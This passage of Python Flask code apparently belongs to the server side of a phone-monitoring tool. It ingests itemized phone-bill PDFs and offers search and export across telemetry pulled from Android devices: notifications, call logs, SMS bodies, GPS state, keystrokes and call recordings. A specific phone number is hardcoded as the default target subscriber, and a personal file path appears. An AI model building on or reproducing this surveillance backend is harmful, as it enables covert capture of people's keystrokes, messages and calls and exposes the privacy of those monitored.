            target_subscriber=target_sub
        ).first()

    # If already exists and re-upload is not forced, ignore duplicate upload!
    if existing_statement and not allow_reupload:
        if file_hash and not existing_statement.file_hash:
            try:
                existing_statement.file_hash = file_hash
                db.session.commit()
            except Exception:
                db.session.rollback()

        return {
            'status': 'skipped',
            'duplicate': True,
            'skipped': True,
            'message': f"Statement '{filename}' (Period: {existing_statement.bill_period}) already exists in database. Duplicate file ignored.",
            'statement_id': existing_statement.id,
            'filename': existing_statement.filename,
            'bill_period': existing_statement.bill_period,
            'inserted_calls': 0,
            'inserted_sms': 0,
            'skipped_calls': parsed_data.get('total_calls', 0),
            'skipped_sms': parsed_data.get('total_sms', 0),
            'total_calls': existing_statement.total_calls,
            'total_sms': existing_statement.total_sms,
            'total_duration_sec': existing_statement.total_duration_sec
        }

    # Pre-fetch existing calls and SMS sets BEFORE adding any new objects to session
    raw_calls = parsed_data.get('calls', [])
    raw_sms = parsed_data.get('sms', [])

    existing_calls_query = db.session.query(
        CdrCall.occurred_at,
        CdrCall.destination_number,
        CdrCall.duration_sec
    ).filter(CdrCall.source_subscriber == target_sub)

    existing_calls_set = {
        (_normalize_dt_for_comparison(rec[0]), str(rec[1]).strip(), int(rec[2]))
        for rec in existing_calls_query.all()
    }

    existing_sms_query = db.session.query(
        CdrSms.occurred_at,
        CdrSms.destination_number,
        CdrSms.sms_count
    ).filter(CdrSms.source_subscriber == target_sub)

    existing_sms_set = {
        (_normalize_dt_for_comparison(rec[0]), str(rec[1]).strip(), int(rec[2]))
        for rec in existing_sms_query.all()
    }

    # Brand new statement
    if not existing_statement:
        statement = CdrStatement(
            filename=filename,
            file_hash=file_hash,
            bill_no=bill_no,
            account_no=account_no,
            bill_period=bill_period,
            bill_date=parsed_data.get('bill_date'),
            target_subscriber=target_sub,
            total_calls=0,
            total_sms=0,
            total_duration_sec=0,
            total_pulses=0,
            uploaded_at=datetime.now(timezone.utc)
        )
        db.session.add(statement)
        db.session.flush()
    else:
        statement = existing_statement

    # 2. RECORD-LEVEL DUPLICATE CHECK (CALLS)
    inserted_calls = 0
    skipped_calls = 0
    total_call_duration_added = 0
    total_call_pulses_added = 0
    seen_batch_calls = set()

    for c in raw_calls:
        raw_occ = c.get('occurred_at') or datetime.now(timezone.utc)
        norm_occ = _normalize_dt_for_comparison(raw_occ)
        dest_num = str(c.get('destination_number', '')).strip()
        dur_sec = int(c.get('duration_sec', 0))

        call_key = (norm_occ, dest_num, dur_sec)

        if call_key in existing_calls_set or call_key in seen_batch_calls:
            skipped_calls += 1
            continue

        seen_batch_calls.add(call_key)
        existing_calls_set.add(call_key)

        pulse_val = int(c.get('pulse', 1))
        call_entry = CdrCall(
            statement_id=statement.id,
            source_subscriber=c.get('source_subscriber') or target_sub,
            serial_no=c.get('serial_no'),
            occurred_at=raw_occ,
            call_date_str=c.get('call_date_str'),
            call_time_str=c.get('call_time_str'),
            destination_number=dest_num,
            duration_str=c.get('duration_str') or '00:00',
            duration_sec=dur_sec,
            pulse=pulse_val,
            amount=float(c.get('amount', 0.00)),
            operator=c.get('operator'),
            call_category=c.get('call_category'),
            page_number=c.get('page_number')
        )
        db.session.add(call_entry)
        inserted_calls += 1
        total_call_duration_added += dur_sec
        total_call_pulses_added += pulse_val

    # 3. RECORD-LEVEL DUPLICATE CHECK (SMS)
    inserted_sms = 0
    skipped_sms = 0
    total_sms_pulses_added = 0
    seen_batch_sms = set()

    for s in raw_sms:
        raw_occ = s.get('occurred_at') or datetime.now(timezone.utc)
        norm_occ = _normalize_dt_for_comparison(raw_occ)
        dest_num = str(s.get('destination_number', '')).strip()
        s_count = int(s.get('sms_count', 1))

        sms_key = (norm_occ, dest_num, s_count)

        if sms_key in existing_sms_set or sms_key in seen_batch_sms:
            skipped_sms += 1
            continue

        seen_batch_sms.add(sms_key)
        existing_sms_set.add(sms_key)

        pulse_val = int(s.get('pulse', 1))
        sms_entry = CdrSms(
            statement_id=statement.id,
            source_subscriber=s.get('source_subscriber') or target_sub,
            serial_no=s.get('serial_no'),
            occurred_at=raw_occ,
            sms_date_str=s.get('sms_date_str'),
            sms_time_str=s.get('sms_time_str'),
            destination_number=dest_num,
            sms_count=s_count,
            pulse=pulse_val,
            amount=float(s.get('amount', 0.00)),
            operator=s.get('operator'),
            sms_category=s.get('sms_category'),
            page_number=s.get('page_number')
        )
        db.session.add(sms_entry)
        inserted_sms += 1
        total_sms_pulses_added += pulse_val

    statement.total_calls = inserted_calls
    statement.total_sms = inserted_sms
    statement.total_duration_sec = total_call_duration_added
    statement.total_pulses = total_call_pulses_added + total_sms_pulses_added

    db.session.commit()

    return {
        'status': 'success',
        'duplicate': False,
        'skipped': False,
        'statement_id': statement.id,
        'filename': filename,
        'bill_period': statement.bill_period,
        'inserted_calls': inserted_calls,
        'inserted_sms': inserted_sms,
        'skipped_calls': skipped_calls,
        'skipped_sms': skipped_sms,
        'total_duration_sec': statement.total_duration_sec
    }


@app.route('/dashboard/cdr')
@require_login
def dashboard_cdr():
    """Itemized Call Details & Sent SMS Explorer from uploaded statements."""
    tab = request.args.get('tab', 'calls')  # 'calls', 'sms', 'analytics', 'statements'
    query_str = request.args.get('q', '').strip()
    period_filter = request.args.get('period', '').strip()
    category_filter = request.args.get('category', '').strip()
    sort_order = request.args.get('sort', 'date_desc')
    page = request.args.get('page', 1, type=int)
    per_page = 50

    target_sub = request.args.get('subscriber', '7760174171').strip() or '7760174171'

    # Overall Summary Statistics
    total_statements = CdrStatement.query.count()
    total_calls_count = db.session.query(func.count(CdrCall.id)).filter(CdrCall.source_subscriber == target_sub).scalar() or 0
    total_sms_count = db.session.query(func.count(CdrSms.id)).filter(CdrSms.source_subscriber == target_sub).scalar() or 0
    total_spoken_seconds = db.session.query(func.sum(CdrCall.duration_sec)).filter(CdrCall.source_subscriber == target_sub).scalar() or 0
    total_call_pulses = db.session.query(func.sum(CdrCall.pulse)).filter(CdrCall.source_subscriber == target_sub).scalar() or 0
    total_sms_pulses = db.session.query(func.sum(CdrSms.pulse)).filter(CdrSms.source_subscriber == target_sub).scalar() or 0

    # Statements & Billing Periods
    statements = CdrStatement.query.order_by(CdrStatement.id.desc()).all()
    periods_raw = db.session.query(CdrStatement.bill_period).distinct().order_by(CdrStatement.bill_period).all()
    periods = [p[0] for p in periods_raw if p[0]]

    # Categories for filters
    call_categories = [c[0] for c in db.session.query(CdrCall.call_category).distinct().order_by(CdrCall.call_category).all() if c[0]]
    sms_categories = [s[0] for s in db.session.query(CdrSms.sms_category).distinct().order_by(CdrSms.sms_category).all() if s[0]]

    # Top Destinations for Analytics tab / rankings
    top_called_numbers = db.session.query(
        CdrCall.destination_number,
        func.count(CdrCall.id).label('call_count'),
        func.sum(CdrCall.duration_sec).label('total_duration'),
        func.sum(CdrCall.pulse).label('total_pulses')
    ).filter(CdrCall.source_subscriber == target_sub)\
     .group_by(CdrCall.destination_number)\
     .order_by(desc('call_count'))\
     .limit(15).all()

    top_duration_numbers = db.session.query(
        CdrCall.destination_number,
        func.count(CdrCall.id).label('call_count'),
        func.sum(CdrCall.duration_sec).label('total_duration'),
        func.sum(CdrCall.pulse).label('total_pulses')
    ).filter(CdrCall.source_subscriber == target_sub)\
     .group_by(CdrCall.destination_number)\
     .order_by(desc('total_duration'))\
     .limit(15).all()

    top_sms_destinations = db.session.query(
        CdrSms.destination_number,
        func.count(CdrSms.id).label('sms_count'),
        func.sum(CdrSms.pulse).label('total_pulses')
    ).filter(CdrSms.source_subscriber == target_sub)\
     .group_by(CdrSms.destination_number)\
     .order_by(desc('sms_count'))\
     .limit(15).all()

    calls_pagination = None
    sms_pagination = None

    if tab == 'calls' or tab not in ['sms', 'analytics', 'statements']:
        cq = db.session.query(CdrCall, CdrStatement.bill_period, CdrStatement.filename)\
            .join(CdrStatement, CdrCall.statement_id == CdrStatement.id)\
            .filter(CdrCall.source_subscriber == target_sub)

        if query_str:
            cq = cq.filter(or_(
                CdrCall.destination_number.ilike(f"%{query_str}%"),
                CdrCall.call_category.ilike(f"%{query_str}%"),
                CdrCall.operator.ilike(f"%{query_str}%")
            ))
        if period_filter:
            cq = cq.filter(CdrStatement.bill_period == period_filter)
        if category_filter:
            cq = cq.filter(CdrCall.call_category.ilike(f"%{category_filter}%"))

        if sort_order == 'date_asc':
            cq = cq.order_by(CdrCall.occurred_at.asc())
        elif sort_order == 'dur_desc':
            cq = cq.order_by(CdrCall.duration_sec.desc(), CdrCall.occurred_at.desc())
        elif sort_order == 'dur_asc':
            cq = cq.order_by(CdrCall.duration_sec.asc(), CdrCall.occurred_at.asc())
        else: # date_desc
            cq = cq.order_by(CdrCall.occurred_at.desc())

        calls_pagination = cq.paginate(page=page, per_page=per_page, error_out=False)

    elif tab == 'sms':
        sq = db.session.query(CdrSms, CdrStatement.bill_period, CdrStatement.filename)\
            .join(CdrStatement, CdrSms.statement_id == CdrStatement.id)\
            .filter(CdrSms.source_subscriber == target_sub)

        if query_str:
            sq = sq.filter(or_(
                CdrSms.destination_number.ilike(f"%{query_str}%"),
                CdrSms.sms_category.ilike(f"%{query_str}%"),
                CdrSms.operator.ilike(f"%{query_str}%")
            ))
        if period_filter:
            sq = sq.filter(CdrStatement.bill_period == period_filter)
        if category_filter:
            sq = sq.filter(CdrSms.sms_category.ilike(f"%{category_filter}%"))

        if sort_order == 'date_asc':
            sq = sq.order_by(CdrSms.occurred_at.asc())
        else:
            sq = sq.order_by(CdrSms.occurred_at.desc())

        sms_pagination = sq.paginate(page=page, per_page=per_page, error_out=False)

    return render_template(
        'cdr_dashboard.html',
        tab=tab,
        query=query_str,
        period_filter=period_filter,
        category_filter=category_filter,
        sort_order=sort_order,
        target_subscriber=target_sub,
        total_statements=total_statements,
        total_calls_count=total_calls_count,
        total_sms_count=total_sms_count,
        total_spoken_seconds=total_spoken_seconds,
        total_call_pulses=total_call_pulses,
        total_sms_pulses=total_sms_pulses,
        statements=statements,
        periods=periods,
        call_categories=call_categories,
        sms_categories=sms_categories,
        top_called_numbers=top_called_numbers,
        top_duration_numbers=top_duration_numbers,
        top_sms_destinations=top_sms_destinations,
        calls_pagination=calls_pagination,
        sms_pagination=sms_pagination
    )


@app.route('/dashboard/cdr/upload', methods=['POST'])
@require_login
def dashboard_cdr_upload():
    """Upload and process one or more PDF statement files."""
    files = request.files.getlist('statement_files')
    if not files or all(f.filename == '' for f in files):
        single_file = request.files.get('statement_file')
        if single_file and single_file.filename:
            files = [single_file]

    if not files or all(f.filename == '' for f in files):
        if request.headers.get('Accept') == 'application/json' or request.is_json:
            return jsonify({'status': 'error', 'message': 'No files uploaded'}), 400
        return redirect(url_for('dashboard_cdr', error='No files selected'))

    target_sub = request.form.get('target_subscriber', '7760174171').strip() or '7760174171'

    results = []
    for f in files:
        if f and f.filename and f.filename.lower().endswith('.pdf'):
            try:
                file_bytes = io.BytesIO(f.read())
                parsed = parse_cdr_pdf(file_bytes, target_subscriber=target_sub, filename=f.filename)
                ingest_res = ingest_cdr_data(parsed, target_subscriber=target_sub)
                results.append(ingest_res)
            except Exception as e:
                app.logger.error(f"Failed to parse CDR PDF {f.filename}: {e}", exc_info=True)
                results.append({'filename': f.filename, 'status': 'error', 'message': str(e)})

    total_calls_added = sum(r.get('inserted_calls', 0) for r in results if r.get('status') == 'success')
    total_sms_added = sum(r.get('inserted_sms', 0) for r in results if r.get('status') == 'success')
    total_calls_skipped = sum(r.get('skipped_calls', 0) for r in results)
    total_sms_skipped = sum(r.get('skipped_sms', 0) for r in results)
    files_added = sum(1 for r in results if r.get('status') == 'success')
    files_skipped = sum(1 for r in results if r.get('status') == 'skipped')

    if request.headers.get('Accept') == 'application/json' or request.is_json:
        return jsonify({
            'status': 'success',
            'files_processed': len(results),
            'files_added': files_added,
            'files_skipped': files_skipped,
            'total_calls_added': total_calls_added,
            'total_sms_added': total_sms_added,
            'total_calls_skipped': total_calls_skipped,
            'total_sms_skipped': total_sms_skipped,
            'details': results
        })

    if files_added == 0 and files_skipped > 0:
        msg = f"Duplicate check: All {files_skipped} uploaded statement file(s) are already present in database. Duplicate records ignored (0 new records added)."
        return redirect(url_for('dashboard_cdr', msg=msg))
    elif files_skipped > 0:
        msg = f"Processed {len(results)} statement(s): +{total_calls_added} calls, +{total_sms_added} SMS added ({files_skipped} duplicate statement(s) ignored)."
        return redirect(url_for('dashboard_cdr', msg=msg))
    else:
        msg = f"Processed {len(results)} statement(s): +{total_calls_added} calls, +{total_sms_added} SMS added."
        return redirect(url_for('dashboard_cdr', msg=msg))


@app.route('/dashboard/cdr/import-local', methods=['POST'])
@require_login
def dashboard_cdr_import_local():
    """Scan local directory for statement PDFs and ingest them."""
    import glob
    target_sub = request.form.get('target_subscriber', '7760174171').strip() or '7760174171'
    
    search_paths = [
        '/Users/om/Documents/workspaces/cf/cr/*.pdf',
        '/data/statements/*.pdf',
        './cr/*.pdf'
    ]
    pdf_files = []
    for sp in search_paths:
        found = glob.glob(sp)
        if found:
            pdf_files.extend(found)

    pdf_files = sorted(list(set(pdf_files)))
    if not pdf_files:
        return jsonify({'status': 'error', 'message': 'No statement PDFs found on server path'}), 404

    results = []
    for pf in pdf_files:
        try:
            parsed = parse_cdr_pdf(pf, target_subscriber=target_sub)
            ingest_res = ingest_cdr_data(parsed, target_subscriber=target_sub)
            results.append(ingest_res)
        except Exception as e:
            app.logger.error(f"Error importing local CDR {pf}: {e}", exc_info=True)
            results.append({'filename': os.path.basename(pf), 'status': 'error', 'message': str(e)})

    total_calls_added = sum(r.get('inserted_calls', 0) for r in results if r.get('status') == 'success')
    total_sms_added = sum(r.get('inserted_sms', 0) for r in results if r.get('status') == 'success')
    total_calls_skipped = sum(r.get('skipped_calls', 0) for r in results)
    total_sms_skipped = sum(r.get('skipped_sms', 0) for r in results)
    files_added = sum(1 for r in results if r.get('status') == 'success')
    files_skipped = sum(1 for r in results if r.get('status') == 'skipped')

    return jsonify({
        'status': 'success',
        'files_processed': len(results),
        'files_added': files_added,
        'files_skipped': files_skipped,
        'total_calls_added': total_calls_added,
        'total_sms_added': total_sms_added,
        'total_calls_skipped': total_calls_skipped,
        'total_sms_skipped': total_sms_skipped,
        'details': results
    })


@app.route('/dashboard/cdr/export')
@require_login
def dashboard_cdr_export():
    """Export CDR calls or SMS as CSV."""
    export_type = request.args.get('type', 'calls')
    target_sub = request.args.get('subscriber', '7760174171').strip() or '7760174171'
    period = request.args.get('period', '').strip()

    output = io.StringIO()
    writer = csv.writer(output)

    if export_type == 'sms':
        writer.writerow(['Subscriber', 'Serial No', 'Date', 'Time', 'Timestamp (ISO)', 'Destination / Shortcode', 'Count', 'Pulse', 'Amount (INR)', 'Operator / Roaming Circle', 'Category', 'Statement File', 'Bill Period'])
        sq = db.session.query(CdrSms, CdrStatement.bill_period, CdrStatement.filename)\
            .join(CdrStatement, CdrSms.statement_id == CdrStatement.id)\
            .filter(CdrSms.source_subscriber == target_sub)
        if period:
            sq = sq.filter(CdrStatement.bill_period == period)
        for s, bp, fn in sq.order_by(CdrSms.occurred_at.asc()).all():
            writer.writerow([
                s.source_subscriber,
                s.serial_no,
                s.sms_date_str,
                s.sms_time_str,
                s.occurred_at.isoformat() if s.occurred_at else '',
                s.destination_number,
                s.sms_count,
                s.pulse,
                f"{float(s.amount or 0):.2f}",
                s.operator or 'Local Circle',
                s.sms_category,
                fn,
                bp
            ])
        csv_data = output.getvalue()
        return Response(csv_data, mimetype='text/csv', headers={
            'Content-Disposition': f'attachment; filename=sent_sms_{target_sub}.csv'
        })
    else: # calls
        writer.writerow(['Subscriber', 'Serial No', 'Date', 'Time', 'Timestamp (ISO)', 'Destination Number', 'Duration (Str)', 'Duration (Seconds)', 'Pulse', 'Amount (INR)', 'Operator / Roaming Circle', 'Category', 'Statement File', 'Bill Period'])
        cq = db.session.query(CdrCall, CdrStatement.bill_period, CdrStatement.filename)\
            .join(CdrStatement, CdrCall.statement_id == CdrStatement.id)\
            .filter(CdrCall.source_subscriber == target_sub)
        if period:
            cq = cq.filter(CdrStatement.bill_period == period)
        for c, bp, fn in cq.order_by(CdrCall.occurred_at.asc()).all():
            writer.writerow([
                c.source_subscriber,
                c.serial_no,
                c.call_date_str,
                c.call_time_str,
                c.occurred_at.isoformat() if c.occurred_at else '',
                c.destination_number,
                c.duration_str,
                c.duration_sec,
                c.pulse,
                f"{float(c.amount or 0):.2f}",
                c.operator or 'Local Circle',
                c.call_category,
                fn,
                bp
            ])
        csv_data = output.getvalue()
        return Response(csv_data, mimetype='text/csv', headers={
            'Content-Disposition': f'attachment; filename=outgoing_calls_{target_sub}.csv'
        })


@app.route('/dashboard/cdr/delete/<int:statement_id>', methods=['POST'])
@require_login
def dashboard_cdr_delete(statement_id):
    """Delete statement and all associated calls and SMS."""
    stmt = db.session.get(CdrStatement, statement_id)
    if stmt:
        filename = stmt.filename
        db.session.delete(stmt)
        db.session.commit()
        return redirect(url_for('dashboard_cdr', msg=f"Deleted statement {filename} and all associated records."))
    return redirect(url_for('dashboard_cdr', error="Statement not found."))


def perform_global_search(query_str, device_id=None, category='all', limit_per_category=100):
    """
    Perform a case-insensitive LIKE search across all telemetry tables:
    - Notifications (title, content, app_name, app_package, category, device_id)
    - Call Logs (phone_number, contact_name, call_type, sim_slot, device_id)
    - SMS Messages (address, contact_name, body, sms_type, sim_slot, device_id)
    - Devices (device_id, device_model, android_version, app_version)
    - GPS Logs (device_id, boolean on/off keywords)
    - Keystrokes (text, app_name, app_package, device_id)
    - Call Recordings (phone_number, contact_name, call_type, device_id)
    """
    query_str = (query_str or '').strip()
    results = {
        'query': query_str,
        'selected_category': category,
        'total_count': 0,
        'counts': {
            'notifications': 0,
            'calls': 0,
            'sms': 0,
            'devices': 0,
            'gps': 0,
            'keystrokes': 0,
            'recordings': 0
        },
        'records': {
            'notifications': [],
            'calls': [],
            'sms': [],
            'devices': [],
            'gps': [],
            'keystrokes': [],
            'recordings': []
        }
    }

    if not query_str:
        return results

    pattern = f"%{query_str}%"

    # 1. Notifications
    nq = Notification.query
    if device_id:
        nq = nq.filter(Notification.device_id == device_id)
    nq = nq.filter(or_(
        Notification.title.ilike(pattern),
        Notification.content.ilike(pattern),
        Notification.app_name.ilike(pattern),
        Notification.app_package.ilike(pattern),
        Notification.category.ilike(pattern),
        Notification.device_id.ilike(pattern)
    ))
    results['counts']['notifications'] = nq.count()
    if category in ['all', 'notifications']:
        results['records']['notifications'] = nq.order_by(Notification.received_at.desc()).limit(limit_per_category).all()

    # 2. Call Logs
    cq = CallLog.query
    if device_id:
        cq = cq.filter(CallLog.device_id == device_id)
    cq = cq.filter(or_(
        CallLog.phone_number.ilike(pattern),
        CallLog.contact_name.ilike(pattern),
        CallLog.call_type.ilike(pattern),
        CallLog.sim_slot.ilike(pattern),
        CallLog.device_id.ilike(pattern)
    ))
    results['counts']['calls'] = cq.count()
    if category in ['all', 'calls']:
        results['records']['calls'] = cq.order_by(CallLog.occurred_at.desc()).limit(limit_per_category).all()

    # 3. SMS Messages
    sq = SmsMessage.query
    if device_id:
        sq = sq.filter(SmsMessage.device_id == device_id)
    sq = sq.filter(or_(
        SmsMessage.address.ilike(pattern),
        SmsMessage.contact_name.ilike(pattern),
        SmsMessage.body.ilike(pattern),
        SmsMessage.sms_type.ilike(pattern),
        SmsMessage.sim_slot.ilike(pattern),
        SmsMessage.device_id.ilike(pattern)
    ))
    results['counts']['sms'] = sq.count()
    if category in ['all', 'sms']:
        results['records']['sms'] = sq.order_by(SmsMessage.occurred_at.desc()).limit(limit_per_category).all()

    # 4. Active Devices / Nodes
    dq = Device.query
    if device_id:
        dq = dq.filter(Device.device_id == device_id)
    dq = dq.filter(or_(
        Device.device_id.ilike(pattern),
        Device.device_model.ilike(pattern),
        Device.android_version.ilike(pattern),
        Device.app_version.ilike(pattern)
    ))
    results['counts']['devices'] = dq.count()
    if category in ['all', 'devices']:
        results['records']['devices'] = dq.order_by(Device.last_ping.desc().nullslast()).limit(limit_per_category).all()

    # 5. GPS Logs
    gps_conditions = [GpsLog.device_id.ilike(pattern)]
    lower_q = query_str.lower()
    if lower_q in ['gps on', 'on', 'enabled', 'true']:
        gps_conditions.append(GpsLog.is_enabled.is_(True))
    elif lower_q in ['gps off', 'off', 'disabled', 'false']:
        gps_conditions.append(GpsLog.is_enabled.is_(False))

    gq = GpsLog.query
    if device_id:
        gq = gq.filter(GpsLog.device_id == device_id)
    gq = gq.filter(or_(*gps_conditions))
    results['counts']['gps'] = gq.count()
    if category in ['all', 'gps']:
        results['records']['gps'] = gq.order_by(GpsLog.occurred_at.desc()).limit(limit_per_category).all()

    # 6. Keystrokes (Phase 2 model)
    try:
        kq = Keystroke.query
        if device_id:
            kq = kq.filter(Keystroke.device_id == device_id)
        kq = kq.filter(or_(
            Keystroke.text.ilike(pattern),
            Keystroke.app_name.ilike(pattern),
            Keystroke.app_package.ilike(pattern),
            Keystroke.device_id.ilike(pattern)
        ))
        results['counts']['keystrokes'] = kq.count()
        if category in ['all', 'keystrokes']:
            results['records']['keystrokes'] = kq.order_by(Keystroke.captured_at.desc()).limit(limit_per_category).all()
    except Exception:
        pass

    # 7. Call Recordings (Phase 2 model)
    try:
        rq = CallRecording.query
        if device_id:
            rq = rq.filter(CallRecording.device_id == device_id)
        rq = rq.filter(or_(
            CallRecording.phone_number.ilike(pattern),
            CallRecording.contact_name.ilike(pattern),
            CallRecording.call_type.ilike(pattern),
            CallRecording.device_id.ilike(pattern)
        ))
        results['counts']['recordings'] = rq.count()
        if category in ['all', 'recordings']:
            results['records']['recordings'] = rq.order_by(CallRecording.recorded_at.desc()).limit(limit_per_category).all()
    except Exception:
        pass

    # 8. CDR Statement Calls (Outgoing Itemized Statement Calls)
    try:
        cdrq = db.session.query(CdrCall, CdrStatement.bill_period, CdrStatement.filename)\
            .join(CdrStatement, CdrCall.statement_id == CdrStatement.id)
        cdrq = cdrq.filter(or_(
            CdrCall.destination_number.ilike(pattern),
            CdrCall.source_subscriber.ilike(pattern),
            CdrCall.operator.ilike(pattern),
            CdrCall.call_category.ilike(pattern),
            CdrStatement.bill_period.ilike(pattern),
            CdrStatement.filename.ilike(pattern)
        ))
        results['counts']['cdr_calls'] = cdrq.count()
        if category in ['all', 'cdr_calls', 'calls', 'statements']:
            results['records']['cdr_calls'] = cdrq.order_by(CdrCall.occurred_at.desc()).limit(limit_per_category).all()
    except Exception:
        pass

    # 9. CDR Statement SMS (Sent Itemized Statement SMS)
    try:
        cdrsmsq = db.session.query(CdrSms, CdrStatement.bill_period, CdrStatement.filename)\
            .join(CdrStatement, CdrSms.statement_id == CdrStatement.id)
        cdrsmsq = cdrsmsq.filter(or_(
            CdrSms.destination_number.ilike(pattern),
            CdrSms.source_subscriber.ilike(pattern),
            CdrSms.operator.ilike(pattern),
            CdrSms.sms_category.ilike(pattern),
            CdrStatement.bill_period.ilike(pattern),
            CdrStatement.filename.ilike(pattern)
        ))
        results['counts']['cdr_sms'] = cdrsmsq.count()
        if category in ['all', 'cdr_sms', 'sms', 'statements']:
            results['records']['cdr_sms'] = cdrsmsq.order_by(CdrSms.occurred_at.desc()).limit(limit_per_category).all()
    except Exception:
        pass

    results['total_count'] = sum(results['counts'].values())
    return results


@app.route('/dashboard/search')
@require_login
def dashboard_search():
    """Universal case-insensitive search across all tables."""
    query_str = request.args.get('q', '').strip()
    category = request.args.get('type', 'all')
    device_filter = session.get('selected_device_id')

    url_device = request.args.get('device')
    if url_device:
        if url_device in ['all', '']:
            device_filter = None
        else:
            device_filter = url_device

    search_data = perform_global_search(query_str, device_id=device_filter, category=category)
    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()
    device_map = {d.device_id: d.device_model or d.device_id for d in devices}

    return render_template(
        'search.html',
        query=query_str,
        category=category,
        search_data=search_data,
        devices=devices,
        device_map=device_map,
        current_device=device_filter
    )


@app.route('/api/v1/search', methods=['GET'])
def api_search():
    """API endpoint for cross-table case-insensitive search."""
    key = request.headers.get('X-API-Key')
    if (not key or key != get_api_key()) and not session.get('logged_in'):
        return jsonify({'error': 'unauthorized'}), 401

    query_str = request.args.get('q', '').strip()
    category = request.args.get('type', 'all')
    device_id = request.args.get('device_id')
    limit = min(request.args.get('limit', 50, type=int), 200)

    if not query_str:
        return jsonify({
            'query': '',
            'total_results': 0,
            'counts': {},
            'results': {}
        })

    search_data = perform_global_search(query_str, device_id=device_id, category=category, limit_per_category=limit)

    serialized_results = {
        'notifications': [{
            'id': n.id,
            'device_id': n.device_id,
            'app_package': n.app_package,
            'app_name': n.app_name,
            'title': n.title,
            'content': n.content,
            'category': n.category,
            'received_at': n.received_at.isoformat() if n.received_at else None
        } for n in search_data['records'].get('notifications', [])],
        'calls': [{
            'id': c.id,
            'device_id': c.device_id,
            'phone_number': c.phone_number,
            'contact_name': c.contact_name,
            'call_type': c.call_type,
            'duration_sec': c.duration_sec,
            'sim_slot': c.sim_slot,
            'occurred_at': c.occurred_at.isoformat() if c.occurred_at else None
        } for c in search_data['records'].get('calls', [])],
        'sms': [{
            'id': s.id,
            'device_id': s.device_id,
            'address': s.address,
            'contact_name': s.contact_name,
            'body': s.body,
            'sms_type': s.sms_type,
            'sim_slot': s.sim_slot,
            'occurred_at': s.occurred_at.isoformat() if s.occurred_at else None
        } for s in search_data['records'].get('sms', [])],
        'devices': [{
            'device_id': d.device_id,
            'device_model': d.device_model,
            'android_version': d.android_version,
            'app_version': d.app_version,
            'battery_level': d.battery_level,
            'is_charging': d.is_charging,
            'is_online': d.is_online,
            'last_ping': d.last_ping.isoformat() if d.last_ping else None
        } for d in search_data['records'].get('devices', [])],
        'gps': [{
            'id': g.id,
            'device_id': g.device_id,
            'is_enabled': g.is_enabled,
            'occurred_at': g.occurred_at.isoformat() if g.occurred_at else None
        } for g in search_data['records'].get('gps', [])],
        'cdr_calls': [{
            'id': c[0].id,
            'source_subscriber': c[0].source_subscriber,
            'destination_number': c[0].destination_number,
            'duration_str': c[0].duration_str,
            'duration_sec': c[0].duration_sec,
            'pulse': c[0].pulse,
            'amount': float(c[0].amount or 0),
            'operator': c[0].operator,
            'call_category': c[0].call_category,
            'bill_period': c[1],
            'statement_filename': c[2],
            'occurred_at': c[0].occurred_at.isoformat() if c[0].occurred_at else None
        } for c in search_data['records'].get('cdr_calls', [])],
        'cdr_sms': [{
            'id': s[0].id,
            'source_subscriber': s[0].source_subscriber,
            'destination_number': s[0].destination_number,
            'sms_count': s[0].sms_count,
            'pulse': s[0].pulse,
            'amount': float(s[0].amount or 0),
            'operator': s[0].operator,
            'sms_category': s[0].sms_category,
            'bill_period': s[1],
            'statement_filename': s[2],
            'occurred_at': s[0].occurred_at.isoformat() if s[0].occurred_at else None
        } for s in search_data['records'].get('cdr_sms', [])]
    }

    return jsonify({
        'query': query_str,
        'category': category,
        'total_results': search_data['total_count'],
        'counts': search_data['counts'],
        'results': serialized_results
    })


@app.route('/api/v1/export')
@require_api_key
def export_data():
    """Export all data as JSON."""
    notifications = [{
        'id': n.id,
        'device_id': n.device_id,
        'app_package': n.app_package,
        'app_name': n.app_name,
        'title': n.title,
        'content': n.content,
        'category': n.category,
        'received_at': n.received_at.isoformat() if n.received_at else None,
        'synced_at': n.synced_at.isoformat() if n.synced_at else None
    } for n in Notification.query.order_by(Notification.received_at.desc()).all()]

    calls = [{
        'id': c.id,
        'device_id': c.device_id,
        'phone_number': c.phone_number,
        'contact_name': c.contact_name,
        'call_type': c.call_type,
        'duration_sec': c.duration_sec,
        'occurred_at': c.occurred_at.isoformat() if c.occurred_at else None,
        'synced_at': c.synced_at.isoformat() if c.synced_at else None
    } for c in CallLog.query.order_by(CallLog.occurred_at.desc()).all()]

    sms = [{
        'id': s.id,
        'device_id': s.device_id,
        'address': s.address,
        'contact_name': s.contact_name,
        'body': s.body,
        'sms_type': s.sms_type,
        'occurred_at': s.occurred_at.isoformat() if s.occurred_at else None,
        'synced_at': s.synced_at.isoformat() if s.synced_at else None
    } for s in SmsMessage.query.order_by(SmsMessage.occurred_at.desc()).all()]

    return jsonify({
        'status': 'ok',
        'exported_at': datetime.now(timezone.utc).isoformat(),
        'notifications': notifications,
        'call_logs': calls,
        'sms_messages': sms
    })


with app.app_context():
    db.create_all()
    try:
        from sqlalchemy import text
        with db.engine.connect() as conn:
            conn.execute(text("ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
            conn.execute(text("ALTER TABLE sms_messages ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
            conn.execute(text("ALTER TABLE cdr_statements ADD COLUMN IF NOT EXISTS file_hash VARCHAR(64);"))
            conn.execute(text("CREATE INDEX IF NOT EXISTS ix_cdr_statements_file_hash ON cdr_statements(file_hash);"))
            
            # Purge any duplicate records
            conn.execute(text("""
                DELETE FROM sms_messages WHERE id NOT IN (
                    SELECT MIN(id) FROM sms_messages GROUP BY device_id, address, body, occurred_at
                );
            """))
            conn.execute(text("""
                DELETE FROM call_logs WHERE id NOT IN (
                    SELECT MIN(id) FROM call_logs GROUP BY device_id, phone_number, call_type, duration_sec, occurred_at
                );
            """))
            conn.execute(text("""
                DELETE FROM notifications WHERE id NOT IN (
                    SELECT MIN(id) FROM notifications GROUP BY device_id, app_package, title, content, received_at
                );
            """))
            conn.commit()
    except Exception as e:
        app.logger.warning(f"Startup DB migration/cleanup warning: {e}")

    # Auto-seed existing statement PDFs from cr/ directory if table is empty
    try:
        if not app.config.get('TESTING') and os.getenv('SKIP_SEED') != '1' and os.getenv('FLASK_ENV') != 'testing':
            if CdrStatement.query.count() == 0:
                import glob
                candidate_paths = [
                    '/Users/om/Documents/workspaces/cf/cr/*.pdf',
                    '/data/statements/*.pdf',
                    './cr/*.pdf'
                ]
                seed_files = []
                for cp in candidate_paths:
